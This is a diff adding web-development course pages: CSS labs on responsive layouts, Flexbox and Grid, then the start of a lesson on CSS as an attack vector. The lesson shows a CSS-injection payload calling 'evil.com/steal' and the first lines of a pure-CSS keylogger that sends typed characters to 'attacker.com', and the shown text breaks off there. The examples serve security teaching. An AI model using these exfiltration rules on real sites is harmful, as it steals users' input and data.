+    <span class="prop">padding</span>:        <span class="val">0 24px</span>;
+    <span class="prop">height</span>:         <span class="val">64px</span>;
+  }
+
+  <span class="sel">.skills-grid</span> {
+    <span class="prop">grid-template-columns</span>: <span class="val">repeat(2, 1fr)</span>;  <span class="cmt">/* 2 columns on tablet */</span>
+  }
+
+  <span class="sel">h1</span> { <span class="prop">font-size</span>: <span class="val">2.2rem</span>; }
+}
+
+<span class="cmt">/* ── STEP 4: Desktop — 1024px and wider ─────────────────────── */</span>
+<span class="atr">@media</span> (min-width: <span class="val">1024px</span>) {
+
+  <span class="sel">.skills-grid</span> {
+    <span class="prop">grid-template-columns</span>: <span class="val">repeat(3, 1fr)</span>;  <span class="cmt">/* 3 columns on desktop */</span>
+  }
+
+  <span class="sel">h1</span> { <span class="prop">font-size</span>: <span class="val">2.8rem</span>; }
+}
+
+<span class="cmt">/* ── STEP 5: Large desktop — 1200px and wider ───────────────── */</span>
+<span class="atr">@media</span> (min-width: <span class="val">1200px</span>) {
+  <span class="sel">.container</span> {
+    <span class="prop">max-width</span>: <span class="val">1140px</span>;
+    <span class="prop">margin</span>:    <span class="val">0 auto</span>;
+  }
+}
+
+<span class="cmt">/* ── RESPONSIVE UNITS ────────────────────────────────────────── */</span>
+
+<span class="sel">.fluid-width</span>  { <span class="prop">width</span>:     <span class="val">80%</span>; }        <span class="cmt">/* % of parent container */</span>
+<span class="sel">.full-height</span>  { <span class="prop">height</span>:   <span class="val">100vh</span>; }      <span class="cmt">/* 100% of viewport height */</span>
+<span class="sel">.wide-hero</span>    { <span class="prop">width</span>:    <span class="val">100vw</span>; }      <span class="cmt">/* 100% of viewport width */</span>
+
+<span class="cmt">/* clamp(min, preferred, max) — fluid sizing with limits */</span>
+<span class="sel">h1</span> { <span class="prop">font-size</span>: <span class="val">clamp(1.8rem, 5vw, 3.5rem)</span>; }
+<span class="cmt">/*             ↑ never below 1.8rem            ↑ never above 3.5rem
+                             ↑ scales with viewport width in between */</span>
+
+<span class="cmt">/* ── PRINT MEDIA QUERY ───────────────────────────────────────── */</span>
+<span class="atr">@media</span> print {
+  <span class="sel">nav, footer, .sidebar</span> { <span class="prop">display</span>: <span class="val">none</span>; }
+  <span class="sel">body</span>  { <span class="prop">color</span>: <span class="val">black</span>; <span class="prop">background</span>: <span class="val">white</span>; }
+
+  <span class="cmt">/* Show the URL after each link when printing */</span>
+  <span class="sel">a::after</span> { <span class="prop">content</span>: <span class="val">" (" attr(href) ")"</span>; <span class="prop">font-size</span>: <span class="val">0.8rem</span>; }
+}
+</div>
+
+<!-- ───────────────────────────────────────────
+     LAB 1
+     ─────────────────────────────────────────── -->
+<h3 class="session-heading">Lab 1 — Style the Portfolio Website <span class="duration">3 Hours</span></h3>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Lab 1 Objective</div>
+  <p style="margin:4px 0;">Transform the unstyled multi-page HTML portfolio from Week 1 into a visually consistent, fully responsive professional website using a single external CSS file. Students make all design decisions themselves — colour palette, spacing, font choices. No starter code is provided; no design mockup is prescribed. The instructor checks technique, not aesthetic outcome.</p>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part A — CSS Reset, Custom Properties &amp; Global Styles (20 min)</div>
+  <p>Create <code>styles.css</code>, link it to all four portfolio HTML pages, and verify it loads in DevTools before writing a single style rule.</p>
+
+<div class="code-block"><span class="cmt">/* ── styles.css ─────────────────────────────────────────────────── */</span>
+
+<span class="cmt">/* 1. Universal reset — removes browser default spacing inconsistencies */</span>
+<span class="sel">*, *::before, *::after</span> {
+  <span class="prop">box-sizing</span>: <span class="val">border-box</span>;
+  <span class="prop">margin</span>:     <span class="val">0</span>;
+  <span class="prop">padding</span>:    <span class="val">0</span>;
+}
+
+<span class="cmt">/* 2. Custom properties — define your own colour palette and spacing */</span>
+<span class="cmt">/* Students choose their own values for each variable */</span>
+<span class="sel">:root</span> {
+  <span class="prop">--color-primary</span>:    <span class="val">#1F3A6E</span>;   <span class="cmt">/* main brand colour */</span>
+  <span class="prop">--color-secondary</span>:  <span class="val">#E8931F</span>;   <span class="cmt">/* accent colour */</span>
+  <span class="prop">--color-bg</span>:         <span class="val">#F8F9FA</span>;   <span class="cmt">/* page background */</span>
+  <span class="prop">--color-text</span>:       <span class="val">#1a1a1a</span>;   <span class="cmt">/* body text */</span>
+  <span class="prop">--color-surface</span>:    <span class="val">#ffffff</span>;   <span class="cmt">/* card / section background */</span>
+
+  <span class="prop">--font-base</span>:        <span class="val">'Inter', Arial, sans-serif</span>;
+  <span class="prop">--font-size-base</span>:   <span class="val">16px</span>;
+  <span class="prop">--line-height</span>:      <span class="val">1.6</span>;
+
+  <span class="prop">--space-sm</span>:         <span class="val">8px</span>;
+  <span class="prop">--space-md</span>:         <span class="val">16px</span>;
+  <span class="prop">--space-lg</span>:         <span class="val">32px</span>;
+  <span class="prop">--space-xl</span>:         <span class="val">64px</span>;
+
+  <span class="prop">--border-radius</span>:    <span class="val">8px</span>;
+  <span class="prop">--shadow-sm</span>:        <span class="val">0 2px 8px rgba(0,0,0,0.08)</span>;
+  <span class="prop">--shadow-md</span>:        <span class="val">0 4px 20px rgba(0,0,0,0.12)</span>;
+
+  <span class="prop">--transition</span>:       <span class="val">all 0.25s ease</span>;
+}
+
+<span class="cmt">/* 3. Base body styles — all using custom properties */</span>
+<span class="sel">body</span> {
+  <span class="prop">font-family</span>:  <span class="val">var(--font-base)</span>;
+  <span class="prop">font-size</span>:    <span class="val">var(--font-size-base)</span>;
+  <span class="prop">line-height</span>:  <span class="val">var(--line-height)</span>;
+  <span class="prop">color</span>:        <span class="val">var(--color-text)</span>;
+  <span class="prop">background</span>:   <span class="val">var(--color-bg)</span>;
+}
+
+<span class="cmt">/* 4. Make all images responsive by default */</span>
+<span class="sel">img</span> { <span class="prop">max-width</span>: <span class="val">100%</span>; <span class="prop">height</span>: <span class="val">auto</span>; <span class="prop">display</span>: <span class="val">block</span>; }
+</div>
+
+  <div class="box-orange" style="margin-top:10px;">
+    <strong>Security Connection — CSS Variables &amp; Injection:</strong> Defining colours as custom properties and only ever using those variables throughout the stylesheet means a designer cannot accidentally write a raw user-supplied value into a CSS property. This pattern is one layer of protection against CSS injection — all styling values come from a controlled, auditable list of variables, not from unpredictable external input.
+  </div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part B — Header, Navigation &amp; Typography (40 min)</div>
+  <p>Style the header, navigation, and global text elements using custom properties. Apply Flexbox to the navigation so links sit in a horizontal row with a hover state and an active-page indicator.</p>
+
+<div class="code-block"><span class="cmt">/* ── TYPOGRAPHY SCALE ────────────────────────────────────────────── */</span>
+<span class="sel">h1</span> { <span class="prop">font-size</span>: <span class="val">2.5rem</span>; <span class="prop">color</span>: <span class="val">var(--color-primary)</span>; <span class="prop">line-height</span>: <span class="val">1.2</span>; }
+<span class="sel">h2</span> { <span class="prop">font-size</span>: <span class="val">2rem</span>;   <span class="prop">color</span>: <span class="val">var(--color-primary)</span>; }
+<span class="sel">h3</span> { <span class="prop">font-size</span>: <span class="val">1.5rem</span>; }
+
+<span class="sel">a</span>       { <span class="prop">color</span>: <span class="val">var(--color-secondary)</span>; <span class="prop">transition</span>: <span class="val">var(--transition)</span>; }
+<span class="sel">a:hover</span> { <span class="prop">color</span>: <span class="val">var(--color-primary)</span>;   }
+
+<span class="cmt">/* ── SITE HEADER ─────────────────────────────────────────────────── */</span>
+<span class="sel">.site-header</span> {
+  <span class="prop">display</span>:         <span class="val">flex</span>;
+  <span class="prop">justify-content</span>: <span class="val">space-between</span>;
+  <span class="prop">align-items</span>:     <span class="val">center</span>;
+  <span class="prop">padding</span>:         <span class="val">0 var(--space-lg)</span>;
+  <span class="prop">height</span>:          <span class="val">64px</span>;
+  <span class="prop">background</span>:      <span class="val">var(--color-primary)</span>;
+  <span class="prop">box-shadow</span>:      <span class="val">var(--shadow-md)</span>;
+  <span class="prop">position</span>:        <span class="val">sticky</span>;
+  <span class="prop">top</span>:             <span class="val">0</span>;
+  <span class="prop">z-index</span>:         <span class="val">100</span>;   <span class="cmt">/* stays above page content when scrolling */</span>
+}
+
+<span class="sel">.logo</span> {
+  <span class="prop">font-size</span>:   <span class="val">1.5rem</span>;
+  <span class="prop">font-weight</span>: <span class="val">700</span>;
+  <span class="prop">color</span>:       <span class="val">white</span>;
+  <span class="prop">text-decoration</span>: <span class="val">none</span>;
+}
+
+<span class="cmt">/* ── NAVIGATION ─────────────────────────────────────────────────── */</span>
+<span class="sel">.nav</span> {
+  <span class="prop">display</span>: <span class="val">flex</span>;
+  <span class="prop">gap</span>:     <span class="val">4px</span>;
+  <span class="prop">list-style</span>: <span class="val">none</span>;
+}
+
+<span class="sel">.nav a</span> {
+  <span class="prop">display</span>:         <span class="val">block</span>;
+  <span class="prop">padding</span>:         <span class="val">8px 16px</span>;
+  <span class="prop">color</span>:           <span class="val">rgba(255,255,255,0.85)</span>;
+  <span class="prop">text-decoration</span>: <span class="val">none</span>;
+  <span class="prop">border-radius</span>:   <span class="val">var(--border-radius)</span>;
+  <span class="prop">transition</span>:      <span class="val">var(--transition)</span>;
+}
+
+<span class="sel">.nav a:hover</span>                 { <span class="prop">background</span>: <span class="val">rgba(255,255,255,0.12)</span>; <span class="prop">color</span>: <span class="val">white</span>; }
+<span class="sel">.nav a[aria-current="page"]</span>  { <span class="prop">background</span>: <span class="val">var(--color-secondary)</span>;  <span class="prop">color</span>: <span class="val">white</span>; }
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part C — Sections, Cards &amp; Hover Animations (60 min)</div>
+  <p>Style the main content area, each section card, the skills list, and add keyframe animations for page load and hover states.</p>
+
+<div class="code-block"><span class="cmt">/* ── CONTENT CONTAINER ───────────────────────────────────────────── */</span>
+<span class="sel">main</span> {
+  <span class="prop">max-width</span>: <span class="val">1100px</span>;
+  <span class="prop">margin</span>:    <span class="val">0 auto</span>;
+  <span class="prop">padding</span>:   <span class="val">var(--space-xl) var(--space-lg)</span>;
+}
+
+<span class="cmt">/* ── SECTION CARDS ───────────────────────────────────────────────── */</span>
+<span class="sel">section</span> {
+  <span class="prop">background</span>:    <span class="val">var(--color-surface)</span>;
+  <span class="prop">padding</span>:       <span class="val">var(--space-lg)</span>;
+  <span class="prop">border-radius</span>: <span class="val">var(--border-radius)</span>;
+  <span class="prop">box-shadow</span>:    <span class="val">var(--shadow-sm)</span>;
+  <span class="prop">margin-bottom</span>: <span class="val">var(--space-lg)</span>;
+  <span class="prop">transition</span>:    <span class="val">transform 0.25s ease, box-shadow 0.25s ease</span>;
+}
+
+<span class="sel">section:hover</span> {
+  <span class="prop">transform</span>:  <span class="val">translateY(-4px)</span>;      <span class="cmt">/* lifts upward */</span>
+  <span class="prop">box-shadow</span>: <span class="val">var(--shadow-md)</span>;
+}
+
+<span class="sel">section h2</span> {
+  <span class="prop">margin-bottom</span>:   <span class="val">var(--space-md)</span>;
+  <span class="prop">padding-bottom</span>:  <span class="val">var(--space-sm)</span>;
+  <span class="prop">border-bottom</span>:   <span class="val">3px solid var(--color-secondary)</span>;
+}
+
+<span class="cmt">/* ── SKILLS LIST ITEMS ───────────────────────────────────────────── */</span>
+<span class="sel">.skills-list</span>       { <span class="prop">list-style</span>: <span class="val">none</span>; }
+
+<span class="sel">.skills-list li</span> {
+  <span class="prop">padding</span>:         <span class="val">12px 16px</span>;
+  <span class="prop">margin-bottom</span>:   <span class="val">8px</span>;
+  <span class="prop">background</span>:      <span class="val">#F0F4FF</span>;
+  <span class="prop">border-left</span>:     <span class="val">4px solid var(--color-primary)</span>;
+  <span class="prop">border-radius</span>:   <span class="val">0 4px 4px 0</span>;
+  <span class="prop">transition</span>:      <span class="val">border-left-width 0.2s ease, background 0.2s ease</span>;
+}
+
+<span class="sel">.skills-list li:hover</span> {
+  <span class="prop">border-left-width</span>: <span class="val">8px</span>;
+  <span class="prop">background</span>:        <span class="val">#E0E9FF</span>;
+}
+
+<span class="cmt">/* ── KEYFRAME ANIMATIONS ─────────────────────────────────────────── */</span>
+<span class="atr">@keyframes</span> fadeIn {
+  <span class="val">from</span> { <span class="prop">opacity</span>: <span class="val">0</span>; <span class="prop">transform</span>: <span class="val">translateY(20px)</span>; }
+  <span class="val">to</span>   { <span class="prop">opacity</span>: <span class="val">1</span>; <span class="prop">transform</span>: <span class="val">translateY(0)</span>; }
+}
+
+<span class="atr">@keyframes</span> slideInLeft {
+  <span class="val">from</span> { <span class="prop">opacity</span>: <span class="val">0</span>; <span class="prop">transform</span>: <span class="val">translateX(-40px)</span>; }
+  <span class="val">to</span>   { <span class="prop">opacity</span>: <span class="val">1</span>; <span class="prop">transform</span>: <span class="val">translateX(0)</span>; }
+}
+
+<span class="sel">.site-header</span>      { <span class="prop">animation</span>: <span class="val">fadeIn 0.5s ease</span>; }
+<span class="sel">section:nth-child(odd)</span>  { <span class="prop">animation</span>: <span class="val">slideInLeft 0.6s ease</span>; }
+<span class="sel">section:nth-child(even)</span> { <span class="prop">animation</span>: <span class="val">slideInLeft 0.6s ease reverse</span>; }
+
+<span class="cmt">/* ── FOOTER ──────────────────────────────────────────────────────── */</span>
+<span class="sel">footer</span> {
+  <span class="prop">background</span>:  <span class="val">var(--color-primary)</span>;
+  <span class="prop">color</span>:       <span class="val">rgba(255,255,255,0.85)</span>;
+  <span class="prop">text-align</span>:  <span class="val">center</span>;
+  <span class="prop">padding</span>:     <span class="val">var(--space-lg)</span>;
+}
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part D — Responsive Styles (60 min)</div>
+  <p>Reorganise the stylesheet so all base styles are written for mobile (320px+), then add three media queries for tablet, desktop, and large desktop. Test in DevTools responsive mode at each breakpoint.</p>
+
+<div class="code-block"><span class="cmt">/* ── MOBILE BASE (default — no query needed) ─────────────────────── */</span>
+<span class="sel">.site-header</span> { <span class="prop">flex-direction</span>: <span class="val">column</span>; <span class="prop">height</span>: <span class="val">auto</span>; <span class="prop">padding</span>: <span class="val">12px 16px</span>; }
+<span class="sel">.nav</span>          { <span class="prop">flex-direction</span>: <span class="val">column</span>; <span class="prop">width</span>: <span class="val">100%</span>; }
+<span class="sel">main</span>          { <span class="prop">padding</span>: <span class="val">var(--space-lg) var(--space-md)</span>; }
+<span class="sel">h1</span>            { <span class="prop">font-size</span>: <span class="val">1.8rem</span>; }
+
+<span class="cmt">/* ── TABLET 768px+ ───────────────────────────────────────────────── */</span>
+<span class="atr">@media</span> (min-width: <span class="val">768px</span>) {
+  <span class="sel">.site-header</span>    { <span class="prop">flex-direction</span>: <span class="val">row</span>; <span class="prop">height</span>: <span class="val">64px</span>; <span class="prop">padding</span>: <span class="val">0 24px</span>; }
+  <span class="sel">.nav</span>            { <span class="prop">flex-direction</span>: <span class="val">row</span>; <span class="prop">width</span>: <span class="val">auto</span>; }
+  <span class="sel">h1</span>              { <span class="prop">font-size</span>: <span class="val">2.2rem</span>; }
+}
+
+<span class="cmt">/* ── DESKTOP 1024px+ ─────────────────────────────────────────────── */</span>
+<span class="atr">@media</span> (min-width: <span class="val">1024px</span>) {
+  <span class="sel">h1</span> { <span class="prop">font-size</span>: <span class="val">2.8rem</span>; }
+}
+
+<span class="cmt">/* ── LARGE DESKTOP 1200px+ ───────────────────────────────────────── */</span>
+<span class="atr">@media</span> (min-width: <span class="val">1200px</span>) {
+  <span class="sel">main</span> { <span class="prop">max-width</span>: <span class="val">1140px</span>; <span class="prop">padding</span>: <span class="val">var(--space-xl) 0</span>; }
+}
+
+<span class="cmt">/* ── PRINT ────────────────────────────────────────────────────────── */</span>
+<span class="atr">@media</span> print {
+  <span class="sel">.site-header, footer, nav</span> { <span class="prop">display</span>: <span class="val">none</span>; }
+  <span class="sel">body</span>      { <span class="prop">color</span>: <span class="val">black</span>; <span class="prop">background</span>: <span class="val">white</span>; }
+  <span class="sel">a::after</span>  { <span class="prop">content</span>: <span class="val">" (" attr(href) ")"</span>; }
+}
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part E — Cross-Device Test &amp; Review (20 min)</div>
+  <p>Open DevTools responsive mode. Test all four portfolio pages at 375px (mobile), 768px (tablet), 1024px (desktop), and 1440px (large). Checklist before moving to Lab 2:</p>
+  <ul>
+    <li>No horizontal scroll at any breakpoint</li>
+    <li>Navigation is usable by keyboard alone (Tab through links)</li>
+    <li>Images never overflow their container</li>
+    <li>No text is smaller than 14px on any screen size</li>
+    <li>Stylesheet is linked correctly to all four pages (DevTools Network tab — no 404 for styles.css)</li>
+  </ul>
+</div>
+
+<!-- ───────────────────────────────────────────
+     LAB 2
+     ─────────────────────────────────────────── -->
+<h3 class="session-heading">Lab 2 — Responsive Layouts with Flexbox &amp; Grid <span class="duration">3 Hours</span></h3>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Lab 2 Objective</div>
+  <p style="margin:4px 0;">Add three new layout sections to the portfolio using Flexbox and Grid: a skills card grid that wraps automatically, a projects card row with equal-height cards, and a Grid gallery with spanning featured items. Each layout must work correctly at mobile, tablet, and desktop widths without JavaScript.</p>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part A — Skills Cards with Flexbox (45 min)</div>
+
+<div class="code-block"><span class="cmt">/* ── SKILL CARDS — flex-wrap creates responsive row automatically ── */</span>
+<span class="sel">.skills-container</span> {
+  <span class="prop">display</span>:         <span class="val">flex</span>;
+  <span class="prop">flex-wrap</span>:       <span class="val">wrap</span>;
+  <span class="prop">gap</span>:             <span class="val">20px</span>;
+}
+
+<span class="sel">.skill-card</span> {
+  <span class="prop">flex</span>:            <span class="val">1 1 260px</span>;     <span class="cmt">/* grows, shrinks, min width 260px */</span>
+  <span class="prop">background</span>:      <span class="val">var(--color-surface)</span>;
+  <span class="prop">border-radius</span>:   <span class="val">var(--border-radius)</span>;
+  <span class="prop">padding</span>:         <span class="val">24px</span>;
+  <span class="prop">box-shadow</span>:      <span class="val">var(--shadow-sm)</span>;
+  <span class="prop">transition</span>:      <span class="val">transform 0.25s ease, box-shadow 0.25s ease</span>;
+}
+
+<span class="sel">.skill-card:hover</span> {
+  <span class="prop">transform</span>:  <span class="val">translateY(-6px)</span>;
+  <span class="prop">box-shadow</span>: <span class="val">var(--shadow-md)</span>;
+}
+
+<span class="cmt">/* Progress bar — pure CSS, no JavaScript */</span>
+<span class="sel">.skill-bar</span> {
+  <span class="prop">height</span>:          <span class="val">8px</span>;
+  <span class="prop">background</span>:      <span class="val">#E0E0E0</span>;
+  <span class="prop">border-radius</span>:   <span class="val">4px</span>;
+  <span class="prop">margin-top</span>:      <span class="val">12px</span>;
+  <span class="prop">overflow</span>:        <span class="val">hidden</span>;
+}
+
+<span class="sel">.skill-bar-fill</span> {
+  <span class="prop">height</span>:          <span class="val">100%</span>;
+  <span class="prop">background</span>:      <span class="val">linear-gradient(90deg, var(--color-primary), var(--color-secondary))</span>;
+  <span class="prop">border-radius</span>:   <span class="val">4px</span>;
+  <span class="prop">transform-origin</span>:<span class="val">left</span>;
+  <span class="prop">animation</span>:       <span class="val">growBar 1s ease forwards</span>;
+}
+
+<span class="atr">@keyframes</span> growBar {
+  <span class="val">from</span> { <span class="prop">width</span>: <span class="val">0</span>; }
+  <span class="val">to</span>   { <span class="prop">width</span>: <span class="val">var(--skill-level, 75%)</span>; }  <span class="cmt">/* set via inline style */</span>
+}
+
+<span class="cmt">/* HTML example:
+   &lt;div class="skill-bar"&gt;
+     &lt;div class="skill-bar-fill" style="--skill-level: 85%"&gt;&lt;/div&gt;
+   &lt;/div&gt; */</span>
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part B — Projects: Equal-Height Flexbox Cards (45 min)</div>
+
+<div class="code-block"><span class="cmt">/* ── PROJECT CARDS — equal height regardless of content length ─── */</span>
+<span class="sel">.projects-row</span> {
+  <span class="prop">display</span>:   <span class="val">flex</span>;
+  <span class="prop">flex-wrap</span>: <span class="val">wrap</span>;
+  <span class="prop">gap</span>:       <span class="val">24px</span>;
+}
+
+<span class="sel">.project-card</span> {
+  <span class="prop">flex</span>:           <span class="val">1 1 300px</span>;
+  <span class="prop">display</span>:        <span class="val">flex</span>;       <span class="cmt">/* card itself is also a flex container */</span>
+  <span class="prop">flex-direction</span>: <span class="val">column</span>;    <span class="cmt">/* stack image → title → desc → button */</span>
+  <span class="prop">background</span>:     <span class="val">var(--color-surface)</span>;
+  <span class="prop">border-radius</span>:  <span class="val">var(--border-radius)</span>;
+  <span class="prop">box-shadow</span>:     <span class="val">var(--shadow-sm)</span>;
+  <span class="prop">overflow</span>:       <span class="val">hidden</span>;
+  <span class="prop">transition</span>:     <span class="val">var(--transition)</span>;
+}
+
+<span class="sel">.project-card:hover</span> {
+  <span class="prop">transform</span>:  <span class="val">translateY(-6px)</span>;
+  <span class="prop">box-shadow</span>: <span class="val">var(--shadow-md)</span>;
+}
+
+<span class="sel">.project-card__image</span> {
+  <span class="prop">width</span>:    <span class="val">100%</span>;
+  <span class="prop">height</span>:   <span class="val">200px</span>;
+  <span class="prop">object-fit</span>: <span class="val">cover</span>;   <span class="cmt">/* crop to fill — never distorts */</span>
+}
+
+<span class="sel">.project-card__body</span> {
+  <span class="prop">padding</span>:        <span class="val">20px</span>;
+  <span class="prop">display</span>:        <span class="val">flex</span>;
+  <span class="prop">flex-direction</span>: <span class="val">column</span>;
+  <span class="prop">flex-grow</span>:      <span class="val">1</span>;     <span class="cmt">/* stretches to fill remaining card height */</span>
+}
+
+<span class="sel">.project-card__desc</span>  { <span class="prop">flex-grow</span>: <span class="val">1</span>; <span class="prop">margin-bottom</span>: <span class="val">16px</span>; }
+<span class="cmt">/* flex-grow: 1 on the description pushes the button to the very bottom
+   of every card, regardless of how long or short the description is */</span>
+
+<span class="sel">.project-card__btn</span> {
+  <span class="prop">display</span>:         <span class="val">inline-block</span>;
+  <span class="prop">padding</span>:         <span class="val">10px 20px</span>;
+  <span class="prop">background</span>:      <span class="val">var(--color-primary)</span>;
+  <span class="prop">color</span>:           <span class="val">white</span>;
+  <span class="prop">border-radius</span>:   <span class="val">4px</span>;
+  <span class="prop">text-decoration</span>: <span class="val">none</span>;
+  <span class="prop">text-align</span>:      <span class="val">center</span>;
+  <span class="prop">transition</span>:      <span class="val">background 0.2s ease</span>;
+}
+<span class="sel">.project-card__btn:hover</span> { <span class="prop">background</span>: <span class="val">var(--color-secondary)</span>; }
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part C — Grid Gallery with Spanning Featured Items (45 min)</div>
+
+<div class="code-block"><span class="cmt">/* ── RESPONSIVE GRID GALLERY ─────────────────────────────────────── */</span>
+<span class="sel">.gallery-grid</span> {
+  <span class="prop">display</span>:               <span class="val">grid</span>;
+  <span class="prop">grid-template-columns</span>: <span class="val">repeat(auto-fit, minmax(260px, 1fr))</span>;
+  <span class="prop">gap</span>:                   <span class="val">16px</span>;
+}
+
+<span class="sel">.gallery-item</span> {
+  <span class="prop">height</span>:        <span class="val">220px</span>;
+  <span class="prop">border-radius</span>: <span class="val">var(--border-radius)</span>;
+  <span class="prop">overflow</span>:      <span class="val">hidden</span>;
+}
+
+<span class="sel">.gallery-item img</span> {
+  <span class="prop">width</span>:      <span class="val">100%</span>;
+  <span class="prop">height</span>:     <span class="val">100%</span>;
+  <span class="prop">object-fit</span>: <span class="val">cover</span>;
+  <span class="prop">transition</span>: <span class="val">transform 0.4s ease</span>;
+}
+
+<span class="sel">.gallery-item:hover img</span> {
+  <span class="prop">transform</span>: <span class="val">scale(1.05)</span>;  <span class="cmt">/* zoom on hover — clipped by overflow:hidden */</span>
+}
+
+<span class="cmt">/* ── FEATURED ITEMS — span 2 cols and 2 rows ──────────────────── */</span>
+<span class="sel">.gallery-item--featured</span> {
+  <span class="prop">grid-column</span>: <span class="val">span 2</span>;
+  <span class="prop">grid-row</span>:    <span class="val">span 2</span>;
+  <span class="prop">height</span>:      <span class="val">auto</span>;   <span class="cmt">/* height determined by spanning rows */</span>
+}
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part D — Contact Page Two-Column Layout &amp; Pair Review (60 min)</div>
+
+<div class="code-block"><span class="cmt">/* ── TWO-COLUMN CONTACT LAYOUT ───────────────────────────────────── */</span>
+<span class="sel">.contact-layout</span> {
+  <span class="prop">display</span>:        <span class="val">flex</span>;
+  <span class="prop">flex-direction</span>: <span class="val">column</span>;  <span class="cmt">/* stacked on mobile */</span>
+  <span class="prop">gap</span>:            <span class="val">32px</span>;
+}
+
+<span class="atr">@media</span> (min-width: <span class="val">768px</span>) {
+  <span class="sel">.contact-layout</span> {
+    <span class="prop">flex-direction</span>: <span class="val">row</span>;     <span class="cmt">/* side by side on tablet+ */</span>
+  }
+
+  <span class="sel">.contact-info</span> { <span class="prop">flex</span>: <span class="val">0 0 280px</span>; }   <span class="cmt">/* fixed width left panel */</span>
+  <span class="sel">.contact-form</span> { <span class="prop">flex</span>: <span class="val">1</span>; }            <span class="cmt">/* form fills remaining space */</span>
+}
+
+<span class="cmt">/* Each info row (icon + text) is a small flex row */</span>
+<span class="sel">.info-row</span> {
+  <span class="prop">display</span>:     <span class="val">flex</span>;
+  <span class="prop">align-items</span>: <span class="val">center</span>;
+  <span class="prop">gap</span>:         <span class="val">12px</span>;
+  <span class="prop">margin-bottom</span>: <span class="val">16px</span>;
+}
+
+<span class="cmt">/* Form rows — name + email side by side on tablet+ */</span>
+<span class="sel">.form-row</span> {
+  <span class="prop">display</span>:   <span class="val">grid</span>;
+  <span class="prop">grid-template-columns</span>: <span class="val">1fr</span>;  <span class="cmt">/* stacked on mobile */</span>
+  <span class="prop">gap</span>:       <span class="val">16px</span>;
+}
+
+<span class="atr">@media</span> (min-width: <span class="val">768px</span>) {
+  <span class="sel">.form-row</span> { <span class="prop">grid-template-columns</span>: <span class="val">1fr 1fr</span>; }  <span class="cmt">/* side by side */</span>
+}
+</div>
+</div>
+
+<div class="box-orange">
+  <strong>Day 1 Homework:</strong> Choose one of the following extension tasks: (A) add a sticky navigation that shrinks on scroll using a JavaScript class toggle and CSS transition; (B) implement a dark mode toggle using only CSS custom properties and a class on the <code>&lt;html&gt;</code> element; (C) build a timeline section using alternating left-right Flexbox entries. Also visit three professional websites and document how each handles responsive navigation — write one short paragraph per site and bring observations to Day 2.
+</div>
+
+<!-- ===========================================
+     DAY 2
+     =========================================== -->
+<div class="paste-marker" style="margin-top: 40px;">📌 PASTE LOCATION — Day 2 starts here. Paste below Day 1 in your document.</div>
+
+<h2 class="day-heading">Day 2 — CSS Security, Clickjacking Prevention &amp; Secure Styling <span class="duration">8 Hours</span></h2>
+
+<h3 class="session-heading">Theory Session <span class="duration">1 Hour</span></h3>
+
+<p>Day 2 reframes CSS entirely. Until now CSS has been a tool for appearance. Today students learn it is also an attack surface — it can read data, make network requests, and deceive users about what they are clicking. The instructor opens DevTools on live websites throughout this session to make every concept concrete.</p>
+
+<!-- ─────────────────── 2.1 ─────────────────── -->
+<h4 class="topic-heading">2.1 — CSS as an Attack Vector <span class="duration">20 min</span></h4>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Objective</div>
+  <p style="margin:4px 0;">Students can explain three CSS-based attacks — CSS injection, the CSS keylogger, and attribute-selector data exfiltration — and state the root cause and prevention principle for each.</p>
+</div>
+
+<div class="how-box">
+  <strong>How it is achieved:</strong> Each attack is shown as a minimal working code example alongside the safe alternative. The instructor reads each dangerous block aloud and explains step by step what the browser does when it encounters it, including which HTTP requests it makes.
+</div>
+
+<p><strong>Attack 1 — CSS Injection: User Input Reaching a CSS Property</strong></p>
+
+<div class="compare-grid">
+  <div class="compare-bad">
+    <span class="compare-label label-bad">❌ VULNERABLE</span>
+    <pre><span style="color:#EF9A9A">/* Server-side code (PHP / Node / etc.)
+   takes user input and writes it directly
+   into the page's CSS */</span>
+
+<span style="color:#CE93D8">.user-profile</span> {
+  <span style="color:#CE93D8">background-color</span>: <span style="color:#EF9A9A">USER_INPUT_HERE</span>;
+}
+
+<span style="color:#78909C">/* If attacker submits:
+   red; }
+   body { background: url(http://evil.com/steal?data=...); }
+   .hidden {
+   
+   The injected rules execute */</span></pre>
+  </div>
+  <div class="compare-good">
+    <span class="compare-label label-good">✅ SECURE</span>
+    <pre><span style="color:#80CBC4">/* WHITELIST: only allow values
+   from a predefined safe list */</span>
+
+<span style="color:#80CBC4">const</span> ALLOWED_COLOURS = [
+  <span style="color:#A5D6A7">'blue'</span>, <span style="color:#A5D6A7">'green'</span>,
+  <span style="color:#A5D6A7">'red'</span>,  <span style="color:#A5D6A7">'purple'</span>
+];
+
+<span style="color:#80CBC4">if</span> (!ALLOWED_COLOURS
+      .includes(userInput)) {
+  <span style="color:#80CBC4">return</span> error;
+}
+
+<span style="color:#78909C">/* Better: use CSS classes */</span>
+&lt;div <span style="color:#CE93D8">class</span>=<span style="color:#A5D6A7">"theme-blue"</span>&gt;&lt;/div&gt;
+<span style="color:#78909C">/* Attacker controls the class
+   name, never the CSS value */</span></pre>
+  </div>
+</div>
+
+<p style="margin-top:14px;"><strong>Attack 2 — CSS Keylogger: Stealing Keystrokes Without JavaScript</strong></p>
+
+<div class="code-block"><span class="cmt">/* ── HOW THE ATTACK WORKS ────────────────────────────────────────── */</span>
+<span class="cmt">/* CSS attribute selectors can match an input's current value.
+   background-image can trigger an HTTP request.
+   Combined, an attacker builds a keystroke logger in pure CSS. */</span>
+
+<span class="cmt">/* For every character the user might type, inject a rule like this: */</span>
+<span class="sel">input</span>[<span class="prop">value</span>^=<span class="val">"a"</span>] { <span class="prop">background-image</span>: <span class="val">url("https://attacker.com/log?char=a")</span>; }
+<span class="sel">input</span>[<span class="prop">value</span>^=<span class="val">"b"</span>] { <span class="prop">background-image</span>: <span class="val">url("https://attacker.com/log?char=b")</span>; }
